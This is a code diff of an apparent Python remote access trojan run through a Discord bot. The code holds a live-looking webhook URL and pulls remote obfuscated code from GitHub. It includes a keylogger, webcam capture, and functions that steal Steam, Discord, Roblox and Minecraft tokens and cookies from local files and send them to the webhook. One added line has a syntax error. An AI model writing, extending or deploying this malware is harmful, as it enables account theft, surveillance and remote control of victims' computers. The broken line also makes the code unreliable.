@@ -76,7 +76,7 @@ def install_missing_packages():
         'aiohttp', 'pyinstaller', 'pynput', 'opencv-python', 'discord.py'
     ]
     installed = {pkg.key for pkg in pkg_resources.working_set}
-    missing = [pkg for pkg in required if pkg not in installed]
+    missing = [pkg forpkg in required if pkg not in installed]
     if missing:
         logger.info(f"Installing: {missing}")
         for pkg in missing:
@@ -161,7 +161,7 @@ build_executable(spec_path)
 
 # RAT Setup Constants
 WEBHOOK_URL = "https://discordapp.com/api/webhooks/1367882927429517354/QX90d-cK3ezsAbq8aH1jpTo9lPFuasPty_GDeixcUZTiZ6XyiiUausIJ_DIDPZS76IVH"
-TOKEN = "MTM2ODQ0MzMzOTI3NTM3NDY1Mg.GiYXfs.xKF6J_TiyE7F1o2uPH5X5n8OGvtxzEU_TOc8rM"
+TOKEN = "YOUR_VALID_DISCORD_TOKEN_HERE"
 BOT_CONTROL_URL = "https://raw.githubusercontent.com/Elissa1610/bot-host/refs/heads/main/obfuscated%20BOT%20CODE.txt"
 UNIQUE_ID = str(uuid.uuid4())
 
@@ -219,7 +219,7 @@ def start_keylogger():
             log_keystroke(key)
         except Exception as e:
             logger.error(f"Keylogger failed: {e}")
-            return False
+        return False
     try:
         with Listener(on_press=on_press) as listener:
             listener.join()
@@ -277,9 +277,9 @@ def steam_dump():
                 if file == 'loginusers.vdf':
                     with open(os.path.join(root, file), 'r', encoding='utf-8') as f:
                         data = f.read()
-                        if 'steamid' in data:
-                            steam_token = data.split('steamid')[1].split('"')[1]
-                            send_webhook(f"Steam token found: {steam_token}")
+                    if 'steamid' in data:
+                        steam_token = data.split('steamid')[1].split('"')[1]
+                        send_webhook(f"Steam token found: {steam_token}")
         if not steam_token:
             send_webhook("No Steam token found.")
     except Exception as e:
@@ -294,9 +294,9 @@ def discord_dump():
                 if file == 'settings.json' and 'Discord' in root:
                     with open(os.path.join(root, file), 'r', encoding='utf-8') as f:
                         data = f.read()
-                        if 'token' in data:
-                            discord_token = data.split('token')[1].split('"')[1]
-                            send_webhook(f"Discord token found: {discord_token}")
+                    if 'token' in data:
+                        discord_token = data.split('token')[1].split('"')[1]
+                        send_webhook(f"Discord token found: {discord_token}")
         if not discord_token:
             send_webhook("No Discord token found.")
     except Exception as e:
@@ -311,9 +311,9 @@ def roblox_dump():
                 if file == 'client-settings.json':
                     with open(os.path.join(root, file), 'r', encoding='utf-8') as f:
                         data = f.read()
-                        if 'cookie' in data:
-                            roblox_token = data.split('cookie')[1].split('"')[1]
-                            send_webhook(f"Roblox token found: {roblox_token}")
+                    if 'cookie' in data:
+                        roblox_token = data.split('cookie')[1].split('"')[1]
+                        send_webhook(f"Roblox token found: {roblox_token}")
         if not roblox_token:
             send_webhook("No Roblox token found.")
     except Exception as e:
@@ -326,9 +326,9 @@ def minecraft_dump():
         if os.path.exists(minecraft_path):
             with open(minecraft_path, 'r', encoding='utf-8') as f:
                 data = json.load(f)
-                if 'auth_player_name' in data:
-                    minecraft_token = data['auth_player_name']
-                    send_webhook(f"Minecraft session found: {minecraft_token}")
+            if 'auth_player_name' in data:
+                minecraft_token = data['auth_player_name']
+                send_webhook(f"Minecraft session found: {minecraft_token}")
         if not minecraft_token:
             send_webhook("No Minecraft token found.")
     except Exception as e:
@@ -346,7 +346,7 @@ def apply_rootkit_technique():
     try:
         ctypes.windll.user32.MessageBoxW(0, "Rootkit Technique Active", "System Alert", 1)
     except Exception as e:
-        logging.error(f"Failed to apply rootkit technique: {e}")
+        logger.error(f"Failed to apply rootkit technique: {e}")
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -376,16 +376,16 @@ async def on_message(message):
     elif message.content.startswith("!start_webcam"):
         capture_webcam()
 
-    elif message.content.startswith("!steamdump"):
+    elif message.content == "!steamdump":
         steam_dump()
 
-    elif message.content.startswith("!discorddump"):
+    elif message.content == "!discorddump":
         discord_dump()
 
-    elif message.content.startswith("!robloxdump"):
+    elif message.content == "!robloxdump":
         roblox_dump()
 
-    elif message.content.startswith("!minecraftdump"):
+    elif message.content == "!minecraftdump":
         minecraft_dump()
 
     elif message.content == "!exfil_all":
